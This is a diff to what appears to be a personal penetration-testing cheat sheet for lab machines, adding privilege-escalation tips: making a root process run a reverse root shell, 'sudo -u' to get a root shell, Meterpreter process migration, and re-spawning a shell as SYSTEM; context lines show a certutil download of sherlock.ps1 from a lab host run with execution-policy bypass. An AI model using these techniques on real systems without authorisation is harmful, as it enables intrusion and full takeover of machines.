@@ -8,6 +8,7 @@ Things to think about when stuck:
     "What else is open for me to input?"
     "Is the version exploitable? Are there known exploits to this technology?"
     "If I need a specific file type (.asp, .html, etc) have a tried to make a payload with that file extension with msfvenom?"
+    "Is there a process that writes/executes as root? Can I somehow make it write/execute a reverse root shell?"
 
 ---------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------
@@ -140,6 +141,9 @@ Unix Helpers:
 
     "sudo -l" - For listing what can be run as sudo even when as a non-sudoer
 
+    "sudo -u" - For running scripts as another user, preferably with root priviledges.
+        * On the chance that you do have that ability, running "sudo -u rootuser /bin/bash" will give you a root shell.
+
     ps -p $$ - Show which shell the user is currently using reliably
 
     /etc/passwd - Catting/lessing this file will show all the 
@@ -188,5 +192,15 @@ Windows Powershell (WTF)
         sherlock.ps1 - AutoEnumeration of known exploits
             - ie. certutil -urlcache -f http://10.10.10.x/sherlock.ps1 sherlock.ps1
             Then on the target machine: "powershell.exe -exec bypass -Command "& {Import-Module .\sher.ps1; Find-AllVulns}" "
+    
+    Meterpreter Commands:
+        - getuid => same as whoami in windows.
+        - ps => to get to running processes and identify certain users including yourself.
+        - migrate -> to migrate to a more stable user in higher position.
+            * Certain metasploit exploits WILL NOT WORK WITHOUT A STABLE PROCESS/USER.
 
+    Meterprete PrivEsc:
+        - Remeber that sometimes getting another reverse shell with metasploit once you have a session can give you a shell with higher priviledges as NT AUTHORITY/SYSTEM instead of whatever you had earlier.
+        - Try looking for a service that has an authority to migrate to. Then background the process and then try to use 
+        the windows exploit suggestor by searching "suggester" in metasploit. 
 
